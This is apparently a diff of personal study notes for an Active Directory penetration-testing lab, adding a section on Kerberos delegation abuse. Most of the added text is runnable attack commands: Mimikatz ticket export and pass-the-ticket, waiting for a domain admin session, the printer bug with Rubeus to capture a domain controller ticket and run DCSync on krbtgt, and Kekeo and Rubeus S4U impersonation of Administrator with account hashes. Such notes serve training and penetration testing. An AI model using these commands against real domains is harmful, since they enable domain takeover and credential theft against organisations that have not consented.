@@ -20,7 +20,8 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
 
 ## Domain Privilege Escalation
 ### Kerberoasting
-The offline cracking technique which crack the hashes of service accounts via TGS --> then use it to create the silver ticket
+The offline cracking technique which crack the hashes of service accounts via TGS
+> TODO what to do next after retrieve the password
 
 1. Find user accounts used as Service accounts -> Read the service principal name, for this exmaple, we use **MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local**
 ```powershell
@@ -140,6 +141,101 @@ Alternatively, we can use PowerView_dev for requesting a hash:
 ```powershell
 Get-DomainUser -Identity supportXuser | Get-DomainSPNTicket | select -ExpandProperty Hash
 ```
+
+## Kerberos Delegataion
+### Unconstrained Delegation
+> allows delegation to any service to any resource on the domain as a user
+1. find conputer that allow Unconstrained Delegation
+```powershell
+Get-NetComputer -UnConstrained
+
+# Using ActiveDirectory module:
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADUser -Filter {TrustedForDelegation -eq $True}
+```
+2. Compromise the server(s) where Unconstrained delegation is enabled. 
+3. Run following command on it to check if any DA token is available
+```powershell
+Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
+```
+4. if not, wait for a domain admin to connect a service on appsrv
+> We can use the following PowerView command to wait for a particular DA to access a resource on dcorp-adminsrv
+```powershell
+Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
+```
+5. reuse DA token
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;271d9f]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+```
+#### The Printer Bug
+>  trick a high privilege user to connect to a machine with Unconstrained Delegation (Printer Bug + Unconstrained Delegation = DCsync)
+
+1. Capture the TGT of dcorp-dc$ by using [Rubeus](https://github.com/GhostPack/Rubeus) on dcorp-appsrv
+```powershell
+.\Rubeus.exe monitor /interval:5 /nowrap
+```
+2. After that run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) on the student VM:
+```powershell
+
+.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+3. Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
+```powershell
+.\Rubeus.exe ptt /ticket:
+```
+
+4. Once the ticket is injected, run DCSync:
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync/user:dcorp\krbtgt"
+```
+
+### Constrained Delegation
+> allows access only to specified services on specified computers as a user. 
+
+1. Enumerate users and computers with constrained delegation enabled
+```powershell
+# Using PowerView_dev.ps1
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+# Using ActiveDirectory module:
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne"$null"} -Properties msDS-AllowedToDelegateTo
+```
+2. Using asktgt from Kekeo to request a TGT using hash/plaintext password of websvc
+```
+.\kekeo.exe
+kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
+```
+
+3. Using s4u from Kekeo to request a TGS --> request TGS as ANY user
+```
+kekeo# tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
+```
+
+4. then use mimikatz to [pass] the ticket
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorpmssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+```
+
+#### Using Rubeus
+```powershell
+.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
+```
+#### Constrained Delegation to any service running under the same account
+> We can request for alternative services such as: HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights).
+
+In this example, only TIME service is allow but we can also Request for LDAP.
+
+Using kekeo 
+```
+tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
+```
+Using Rubeus
+```powershell
+.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dcorpdc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
+```
+
 
 
 # Jenkin --> move to CVE catagory
